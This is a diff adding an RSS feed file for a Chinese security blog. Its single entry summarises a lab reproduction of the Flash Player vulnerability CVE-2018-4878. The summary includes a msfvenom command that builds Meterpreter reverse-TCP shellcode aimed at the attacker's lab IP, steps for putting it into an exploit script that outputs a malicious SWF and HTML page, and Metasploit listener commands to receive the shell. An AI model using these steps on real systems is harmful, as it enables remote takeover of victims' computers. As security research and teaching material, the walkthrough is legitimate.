@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Flash on F0rmat&#39;Blog</title>
+    <link>https://getshe11.com/tags/flash/</link>
+    <description>Recent content in Flash on F0rmat&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 13 Mar 2018 10:16:27 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/flash/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Flash 0day漏洞(CVE-2018-4878)复现(每日一洞)</title>
+      <link>https://getshe11.com/posts/recurrence-of-flash-0day-vulnerability-cve-2018-4878/</link>
+      <pubDate>Tue, 13 Mar 2018 10:16:27 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/recurrence-of-flash-0day-vulnerability-cve-2018-4878/</guid>
+      <description>前言 这几天很忙，已经有两天没有更新文章了，最近CVE-2018-4878挺火的，还有群里的人也问这个怎么复现。今天就献丑复现一下，大表哥别喷，虽然我还没研究到这方面的漏洞分析，我会努力的，相信不久我也能写出二进制漏洞分析的文章。
+ 该漏洞影响 Flash Player 当前最新版本28.0.0.137以及之前的所有版本，而Adobe公司计划在当地时间2月5日紧急发布更新来修复此漏洞。从Adobe公告致谢来看，这个漏洞的野外攻击样本最早是由韩国计算机应急响应小组（KR-CERT）发现的，而KR-CERT也表示，来自朝鲜的黑客组织已经成功利用这个0Day 漏洞发起攻击。
+ 环境 攻击机： kali 2018 (192.168.59.6) 靶机： Windows 10 x64 (192.168.59.160) Web服务器： Windows 7 X64 (192.168.59.127)
+复现过程  我们先在kali生成一个python类型的shellcode msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.59.6 LPORT=6666 -f p ython &amp;gt; /root/shellcode.txt   LHOST就是kali的ip地址，6666端口你可以随便设置，/root/shellcode.txt要生成的文件路径  替换EXP里面的shellcode  使用cve-2018-4878.py生成文件，我这里用的是Sublime Text 3 Ctrl+B运行python，会在本目录下生成两个文件index.html,exploit.swf  然后把这两个文件放到Web服务器里面  在kali的MSF里面设置监听  msf &amp;gt; use exploit/multi/handler msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_tcp msf exploit(handler) &amp;gt; set LHOST 192.168.59.6 msf exploit(handler) &amp;gt; set LPORT 6666 msf exploit(handler) &amp;gt; exploit 然后使用靶机的win10 IE访问Web服务器的文件index.</description>
+    </item>
+    
+  </channel>
+</rss>
